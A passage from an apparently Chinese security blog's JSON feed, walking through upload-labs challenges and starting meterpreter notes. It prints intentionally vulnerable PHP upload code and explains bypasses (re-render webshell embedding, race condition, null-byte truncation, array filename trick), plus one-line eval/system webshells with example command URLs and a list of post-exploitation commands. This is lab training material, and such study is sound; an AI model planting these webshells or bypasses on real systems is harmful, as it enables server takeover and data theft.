  <span class=\"comment\">//给新图片指定文件名</span></span><br><span class=\"line\">                srand(time());</span><br><span class=\"line\">                <span class=\"variable\">$newfilename</span> = strval(rand()).<span class=\"string\">&quot;.jpg&quot;</span>;</span><br><span class=\"line\">                <span class=\"comment\">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class=\"line\">                <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"variable\">$newfilename</span>;</span><br><span class=\"line\">                imagejpeg(<span class=\"variable\">$im</span>,<span class=\"variable\">$img_path</span>);</span><br><span class=\"line\">                @unlink(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;上传出错！&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>((<span class=\"variable\">$fileext</span> == <span class=\"string\">&quot;png&quot;</span>) &amp;&amp; (<span class=\"variable\">$filetype</span>==<span class=\"string\">&quot;image/png&quot;</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(move_uploaded_file(<span class=\"variable\">$tmpname</span>,<span class=\"variable\">$target_path</span>))&#123;</span><br><span class=\"line\">            <span class=\"comment\">//使用上传的图片生成新的图片</span></span><br><span class=\"line\">            <span class=\"variable\">$im</span> = imagecreatefrompng(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"variable\">$im</span> == <span class=\"literal\">false</span>)&#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class=\"line\">                @unlink(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                 <span class=\"comment\">//给新图片指定文件名</span></span><br><span class=\"line\">                srand(time());</span><br><span class=\"line\">                <span class=\"variable\">$newfilename</span> = strval(rand()).<span class=\"string\">&quot;.png&quot;</span>;</span><br><span class=\"line\">                <span class=\"comment\">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class=\"line\">                <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"variable\">$newfilename</span>;</span><br><span class=\"line\">                imagepng(<span class=\"variable\">$im</span>,<span class=\"variable\">$img_path</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">                @unlink(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;               </span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;上传出错！&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>((<span class=\"variable\">$fileext</span> == <span class=\"string\">&quot;gif&quot;</span>) &amp;&amp; (<span class=\"variable\">$filetype</span>==<span class=\"string\">&quot;image/gif&quot;</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(move_uploaded_file(<span class=\"variable\">$tmpname</span>,<span class=\"variable\">$target_path</span>))&#123;</span><br><span class=\"line\">            <span class=\"comment\">//使用上传的图片生成新的图片</span></span><br><span class=\"line\">            <span class=\"variable\">$im</span> = imagecreatefromgif(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"variable\">$im</span> == <span class=\"literal\">false</span>)&#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class=\"line\">                @unlink(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"comment\">//给新图片指定文件名</span></span><br><span class=\"line\">                srand(time());</span><br><span class=\"line\">                <span class=\"variable\">$newfilename</span> = strval(rand()).<span class=\"string\">&quot;.gif&quot;</span>;</span><br><span class=\"line\">                <span class=\"comment\">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class=\"line\">                <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"variable\">$newfilename</span>;</span><br><span class=\"line\">                imagegif(<span class=\"variable\">$im</span>,<span class=\"variable\">$img_path</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">                @unlink(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;上传出错！&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>先上传一个普通的 gif 图，再进行保存下载，分析两张图片，找到位置相同处进行写马 (图片渲染)</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210312094855752.png\" alt=\"image-20210312094855752\"></p>\n<p>相同位置进行写马</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210312094927938.png\" alt=\"image-20210312094927938\"></p>\n<p>成功上传</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210312095224492.png\" alt=\"image-20210312095224492\"></p>\n<p>利用菜刀进行连接，获得权限</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210312095313316.png\" alt=\"image-20210312095313316\"></p>\n<h2 id=\"pass-17pass-18条件竞争\"><a class=\"markdownIt-Anchor\" href=\"#pass-17pass-18条件竞争\">#</a> Pass-17,Pass-18（条件竞争）</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"variable\">$ext_arr</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;jpg&#x27;</span>,<span class=\"string\">&#x27;png&#x27;</span>,<span class=\"string\">&#x27;gif&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$file_name</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$file_ext</span> = substr(<span class=\"variable\">$file_name</span>,strrpos(<span class=\"variable\">$file_name</span>,<span class=\"string\">&quot;.&quot;</span>)+<span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"variable\">$upload_file</span> = UPLOAD_PATH . <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"variable\">$file_name</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(move_uploaded_file(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$upload_file</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(in_array(<span class=\"variable\">$file_ext</span>,<span class=\"variable\">$ext_arr</span>))&#123;</span><br><span class=\"line\">             <span class=\"variable\">$img_path</span> = UPLOAD_PATH . <span class=\"string\">&#x27;/&#x27;</span>. rand(<span class=\"number\">10</span>, <span class=\"number\">99</span>).date(<span class=\"string\">&quot;YmdHis&quot;</span>).<span class=\"string\">&quot;.&quot;</span>.<span class=\"variable\">$file_ext</span>;</span><br><span class=\"line\">             rename(<span class=\"variable\">$upload_file</span>, <span class=\"variable\">$img_path</span>);</span><br><span class=\"line\">             <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class=\"line\">            unlink(<span class=\"variable\">$upload_file</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"pass-19php00截断jpg上传\"><a class=\"markdownIt-Anchor\" href=\"#pass-19php00截断jpg上传\">#</a> Pass-19 (php00 截断，jpg 上传）</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$deny_ext</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&quot;php&quot;</span>,<span class=\"string\">&quot;php5&quot;</span>,<span class=\"string\">&quot;php4&quot;</span>,<span class=\"string\">&quot;php3&quot;</span>,<span class=\"string\">&quot;php2&quot;</span>,<span class=\"string\">&quot;html&quot;</span>,<span class=\"string\">&quot;htm&quot;</span>,<span class=\"string\">&quot;phtml&quot;</span>,<span class=\"string\">&quot;pht&quot;</span>,<span class=\"string\">&quot;jsp&quot;</span>,<span class=\"string\">&quot;jspa&quot;</span>,<span class=\"string\">&quot;jspx&quot;</span>,<span class=\"string\">&quot;jsw&quot;</span>,<span class=\"string\">&quot;jsv&quot;</span>,<span class=\"string\">&quot;jspf&quot;</span>,<span class=\"string\">&quot;jtml&quot;</span>,<span class=\"string\">&quot;asp&quot;</span>,<span class=\"string\">&quot;aspx&quot;</span>,<span class=\"string\">&quot;asa&quot;</span>,<span class=\"string\">&quot;asax&quot;</span>,<span class=\"string\">&quot;ascx&quot;</span>,<span class=\"string\">&quot;ashx&quot;</span>,<span class=\"string\">&quot;asmx&quot;</span>,<span class=\"string\">&quot;cer&quot;</span>,<span class=\"string\">&quot;swf&quot;</span>,<span class=\"string\">&quot;htaccess&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"variable\">$file_name</span> = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;save_name&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$file_ext</span> = pathinfo(<span class=\"variable\">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!in_array(<span class=\"variable\">$file_ext</span>,<span class=\"variable\">$deny_ext</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH . <span class=\"string\">&#x27;/&#x27;</span> .<span class=\"variable\">$file_name</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123; </span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;上传出错！&#x27;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = UPLOAD_PATH . <span class=\"string\">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">分析，move_uploaded_file()函数中的img_path是由post参数save_name控制的，</span><br><span class=\"line\">因此可以在save_name利用00截断绕过：</span><br><span class=\"line\">首先上传一个图片马</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210313100100590.png\" alt=\"image-20210313100100590\"></p>\n<p>再进行 hex 00 截断</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210313100210338.png\" alt=\"image-20210313100210338\"></p>\n<p>进行上传，上传成功</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210313100235376.png\" alt=\"image-20210313100235376\"></p>\n<p>菜刀连接，拿到 shell</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210313100516143.png\" alt=\"image-20210313100516143\"></p>\n<p>第二种方法，传一个 REQUEST 请求，进行浏览器 GET 得 flag</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210313101545220.png\" alt=\"image-20210313101545220\"></p>\n<p>更改 hex 00 截断上传</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210313101617346.png\" alt=\"image-20210313100443380\"></p>\n<p>浏览器进行 GET 请求访问</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210313101647574.png\" alt=\"image-20210313101647574\"></p>\n<p>查看到 flagvalue.txt</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210313101719963.png\" alt=\"image-20210313101719963\"></p>\n<h2 id=\"pass-20数组绕过\"><a class=\"markdownIt-Anchor\" href=\"#pass-20数组绕过\">#</a> Pass-20 (数组绕过)</h2>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"comment\">//检查MIME</span></span><br><span class=\"line\">    <span class=\"variable\">$allow_type</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;image/jpeg&#x27;</span>,<span class=\"string\">&#x27;image/png&#x27;</span>,<span class=\"string\">&#x27;image/gif&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!in_array(<span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;type&#x27;</span>],<span class=\"variable\">$allow_type</span>))&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//检查文件名</span></span><br><span class=\"line\">        <span class=\"variable\">$file</span> = <span class=\"keyword\">empty</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;save_name&#x27;</span>]) ? <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>] : <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;save_name&#x27;</span>];  判断save_name是否为空,否则用POST传递</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!is_array(<span class=\"variable\">$file</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$file</span> = explode(<span class=\"string\">&#x27;.&#x27;</span>, strtolower(<span class=\"variable\">$file</span>));</span><br><span class=\"line\">        &#125;\texplode - 把字符串打散为数组,以点分隔  strtolower — 将字符串转化为小写</span><br><span class=\"line\">\t\t\t\t</span><br><span class=\"line\">        <span class=\"variable\">$ext</span> = end(<span class=\"variable\">$file</span>);</span><br><span class=\"line\">        <span class=\"variable\">$allow_suffix</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;jpg&#x27;</span>,<span class=\"string\">&#x27;png&#x27;</span>,<span class=\"string\">&#x27;gif&#x27;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!in_array(<span class=\"variable\">$ext</span>, <span class=\"variable\">$allow_suffix</span>)) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"variable\">$file_name</span> = reset(<span class=\"variable\">$file</span>) . <span class=\"string\">&#x27;.&#x27;</span> . <span class=\"variable\">$file</span>[count(<span class=\"variable\">$file</span>) - <span class=\"number\">1</span>];</span><br><span class=\"line\"> reset() 输出数组中的当前元素和下一个元素的值，然后把数组的内部指针重置到数组中的第一个元素</span><br><span class=\"line\"> count() 函数返回数组中元素的数目。</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"variable\">$temp_file</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\">            <span class=\"variable\">$img_path</span> = UPLOAD_PATH . <span class=\"string\">&#x27;/&#x27;</span> .<span class=\"variable\">$file_name</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (move_uploaded_file(<span class=\"variable\">$temp_file</span>, <span class=\"variable\">$img_path</span>)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;文件上传成功！&quot;</span>;</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;文件上传失败！&quot;</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">如果不是数组则将其拆成数组，然后数组最后一个的值(end函数就是取数组最后一个的值)同白名单做比较，符合jpg、png、gif中的一种就允许上传了。</span><br><span class=\"line\"></span><br><span class=\"line\">  在允许上传之后还要把数组的值拼接在一起对文件进行重命名。所以我们可以构造save_name[0]&#x3D;a.php&#x2F;  save_name[1]置为空  save_name[2]&#x3D;jpg(一个白名单的合法后缀)。</span><br><span class=\"line\"></span><br><span class=\"line\">  这样的话，reset($file)取的是数组的第一个元素即cs.php&#x2F;，然后接了一个&#39;.&#39;符号，之后又将数组最后一个元素内容拼接到一起。</span><br><span class=\"line\"></span><br><span class=\"line\">  可能有的人会疑问数组最后一个值不是jpg吗？其实当我们只设置了两个数组元素的时候，数组的元素个数就只有两个了。</span><br><span class=\"line\"></span><br><span class=\"line\">  既然一共只有两个元素，这里就是$file[2-1]也就是$file[1]。因此拼接的就是空的，最终得到的文件名就是a.php&#x2F;.</span><br><span class=\"line\"></span><br><span class=\"line\">  对于像a.php&#x2F;.这样的文件路径，move_uploaded_file()函数会忽略掉文件末尾的&#x2F;.。如此一来我们上传到服务器的文件还是被重命名为了php后缀。</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210313105140361.png\" alt=\"image-20210313105140361\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210313105520758.png\" alt=\"image-20210313105520758\"></p>\n<p>eval 和 system 区别</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php eval($_REQUEST[cmd]);?&gt;</span><br><span class=\"line\">&lt;?php system($_REQUEST[cmd]);?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">PHP的eval类型函数，一句话：代码执行而不是命令执行。（菜刀用这类）</span><br><span class=\"line\">PHP的system类型函数，一句话：命令执行而不是代码执行。</span><br><span class=\"line\"></span><br><span class=\"line\">eval</span><br><span class=\"line\">http:&#x2F;&#x2F;IP&#x2F;upload&#x2F;b.php?cmd&#x3D;system(&quot;dir c:\\\\&quot;);</span><br><span class=\"line\">http:&#x2F;&#x2F;IP&#x2F;upload&#x2F;b.php?cmd&#x3D;system(&quot;type c:\\\\flag*.txt&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">system</span><br><span class=\"line\">http:&#x2F;&#x2F;IP&#x2F;upload&#x2F;b.php?cmd&#x3D;dir c:\\</span><br><span class=\"line\">http:&#x2F;&#x2F;IP&#x2F;upload&#x2F;b.php?cmd&#x3D;type c:\\flag*.txt</span><br></pre></td></tr></table></figure>\n<h2 id=\"拓展过滤\"><a class=\"markdownIt-Anchor\" href=\"#拓展过滤\">#</a> 拓展 (过滤 &lt;?)</h2>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210314105556365.png\" alt=\"image-20210314105556365\"></p>\n<p>buuctf 题目：<span class=\"exturl\" data-url=\"aHR0cDovLzdmMDJmM2Y0LWU2NjUtNDVkZC04NTcyLTFiYjNlZGIxNmE4MS5ub2RlMy5idXVvai5jbi8=\">http://7f02f3f4-e665-45dd-8572-1bb3edb16a81.node3.buuoj.cn/</span></p>\n<p>进行 burp 抓包上传</p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210314105809630.png\" alt=\"image-20210314105809630\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210314105819324.png\" alt=\"image-20210314105819324\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210314110325454.png\" alt=\"image-20210314110325454\"></p>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210314110346852.png\" alt=\"image-20210314110346852\"></p>\n",
            "tags": [
                "upload-labs通关记录"
            ]
        },
        {
            "id": "http://chungod.github.io/2021/04/21/meterpreter%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/",
            "url": "http://chungod.github.io/2021/04/21/meterpreter%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/",
            "title": "meterpreter学习笔记",
            "date_published": "2021-04-21T02:24:41.000Z",
            "content_html": "<h2 id=\"meterpreter学习笔记总结\"><a class=\"markdownIt-Anchor\" href=\"#meterpreter学习笔记总结\">#</a> meterpreter 学习笔记总结</h2>\n<h2 id=\"系统命令\"><a class=\"markdownIt-Anchor\" href=\"#系统命令\">#</a> 系统命令</h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">background # 将当前会话放置后台</span><br><span class=\"line\">sessions # sessions –h 查看帮助</span><br><span class=\"line\">sessions -i &lt;ID 值&gt; #进入会话 -k 杀死会话</span><br><span class=\"line\">bgrun &#x2F; run # 执行已有的模块，输入 run 后按两下 tab，列出已有的脚本</span><br><span class=\"line\">info # 查看已有模块信息</span><br><span class=\"line\">getuid # 查看当前用户身份</span><br><span class=\"line\">getprivs # 查看当前用户具备的权限</span><br><span class=\"line\">getpid # 获取当前进程 ID(PID)</span><br><span class=\"line\">sysinfo # 查看目标机系统信息</span><br><span class=\"line\">irb # 开启 ruby 终端</span><br><span class=\"line\">ps # 查看正在运行的进程</span><br><span class=\"line\">kill &lt;PID 值&gt; # 杀死指定 PID 进程</span><br><span class=\"line\">idletime # 查看目标机闲置时间</span><br><span class=\"line\">reboot &#x2F; shutdown # 重启&#x2F;关机</span><br><span class=\"line\">shell # 进入目标机 cmd shell</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://gitee.com/chungod/picture/raw/master/image/image-20210306164115799.png\" alt=\"image-20210306164115799\"></p>\n<h2 id=\"常用-cmd-命令\"><a class=\"markdownIt-Anchor\" href=\"#常用-cmd-命令\">#</a> 常用 cmd 命令</h2>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span 